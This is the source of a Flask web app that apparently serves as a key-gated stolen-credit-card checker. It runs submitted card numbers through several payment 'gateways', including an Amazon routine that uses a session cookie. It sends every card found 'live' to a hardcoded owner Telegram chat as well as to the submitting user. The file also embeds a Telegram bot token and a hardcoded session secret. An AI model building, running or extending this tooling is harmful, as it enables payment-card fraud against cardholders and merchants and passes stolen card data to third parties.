import os
import asyncio
from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for, render_template, flash
from flask_cors import CORS
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
import requests as req
import tec, red, em, amazon

app = Flask(__name__)
app.secret_key = 'tu_secreto_super_seguro'
CORS(app, resources={r"/*": {"origins": "*"}})

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)
    key = db.Column(db.String(50), unique=True, nullable=False)

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)
    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

class Key(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(50), unique=True, nullable=False)
    used = db.Column(db.Boolean, default=False)

class TelegramUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    telegram_id = db.Column(db.String(20), nullable=False)
    is_admin = db.Column(db.Boolean, default=False)

@app.before_request
def create_tables():
    db.create_all()

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return render_template('index.html')

@app.route('/style.css')
def style():
    return send_from_directory('.', 'style.css')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username'].strip()
        password = request.form['password']
        key_input = request.form['key'].strip()

        key_obj = Key.query.filter_by(key=key_input, used=False).first()
        if not key_obj:
            flash('La key no es válida o ya fue usada.', 'error')
            return redirect(url_for('register'))

        if User.query.filter_by(username=username).first():
            flash('El usuario ya existe.', 'error')
            return redirect(url_for('register'))

        user = User(username=username, key=key_input)
        user.set_password(password)
        db.session.add(user)
        key_obj.used = True
        db.session.commit()
        flash('Registro exitoso, ya puedes iniciar sesión.', 'success')
        return redirect(url_for('index'))
    return render_template('register.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username'].strip()
    password = request.form['password']
    user = User.query.filter_by(username=username).first()
    if user and user.check_password(password):
        session['user_id'] = user.id
        session['username'] = user.username
        flash('Has iniciado sesión con éxito.', 'success')
        return redirect(url_for('dashboard'))
    else:
        flash('Usuario o contraseña incorrectos.', 'error')
        return redirect(url_for('index'))

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('index'))
    return render_template('checker.html', username=session['username'])

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

TELEGRAM_BOT_TOKEN = '7549342155:AAGTeGoCr6s56nckuq8KEDDB7aCKiU5BW3Y'
TELEGRAM_CHAT_ID = '-1002762787906'

@app.route('/save_telegram_id', methods=['POST'])
def save_telegram_id():
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'No autorizado'}), 401

    data = request.get_json()
    telegram_id = data.get('telegram_id')
    if not telegram_id:
        return jsonify({'success': False, 'error': 'Falta telegram_id'})

    user_telegram = TelegramUser.query.filter_by(user_id=session['user_id']).first()
    if user_telegram:
        user_telegram.telegram_id = telegram_id
    else:
        db.session.add(TelegramUser(user_id=session['user_id'], telegram_id=telegram_id))

    db.session.commit()
    return jsonify({'success': True, 'message': 'Telegram ID guardado'})

@app.route('/add_admin', methods=['POST'])
def add_admin():
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'No autorizado'}), 401

    owner_telegram_id = '846983753'
    owner = TelegramUser.query.filter_by(user_id=session['user_id'], telegram_id=owner_telegram_id).first()
    if not owner:
        return jsonify({'success': False, 'error': 'Solo el dueño puede agregar admins'}), 403

    data = request.get_json()
    new_admin_id = data.get('telegram_id')

    if not new_admin_id:
        return jsonify({'success': False, 'error': 'Falta telegram_id'})

    existing = TelegramUser.query.filter_by(telegram_id=new_admin_id).first()
    if existing:
        existing.is_admin = True
    else:
        db.session.add(TelegramUser(user_id=session['user_id'], telegram_id=new_admin_id, is_admin=True))

    db.session.commit()
    return jsonify({'success': True, 'message': f'ID {new_admin_id} ahora es admin.'})

@app.route('/is_admin')
def is_admin():
    if 'user_id' not in session:
        return jsonify({'is_admin': False})

    user_telegram = TelegramUser.query.filter_by(user_id=session['user_id']).first()
    if user_telegram and user_telegram.is_admin:
        return jsonify({'is_admin': True, 'telegram_id': user_telegram.telegram_id})

    return jsonify({'is_admin': False})

def enviar_telegram(mensaje, extra_ids=None):
    ids_to_notify = [TELEGRAM_CHAT_ID, '846983753']
    if extra_ids:
        ids_to_notify += extra_ids

    for chat_id in set(ids_to_notify):
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {'chat_id': chat_id, 'text': mensaje, 'parse_mode': 'Markdown'}
        try:
            req.post(url, data=data)
        except Exception as e:
            print(f"Error enviando Telegram a {chat_id}: {e}")

@app.route('/check', methods=['POST'])
def check_card():
    data = request.get_json()
    cc = data.get('cc')
    gateway = data.get('gateway', 'TEC')
    cookie = data.get('cookie', '')

    try:
        if gateway == 'TEC':
            result = asyncio.run(tec.process_card(cc))
        elif gateway == 'RED':
            result = asyncio.run(red.process_card(cc))
        elif gateway == 'EM':
            result = asyncio.run(em.process_card(cc))
        elif gateway == 'AMAZON':
            result = amazon.procesar_tarjeta_amazon(cc, cookie)
        else:
            result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}

        if result['status'] == 'live':
            mensaje_telegram = f"✅ *LIVE* - {result['cc']}\n{result['message']}"
            user_telegram = TelegramUser.query.filter_by(user_id=session['user_id']).first()
            extra_ids = [user_telegram.telegram_id] if user_telegram and user_telegram.telegram_id else []
            enviar_telegram(mensaje_telegram, extra_ids=extra_ids)

        return jsonify(result)
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/ping')
def ping():
    return jsonify({'message': 'pong'})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
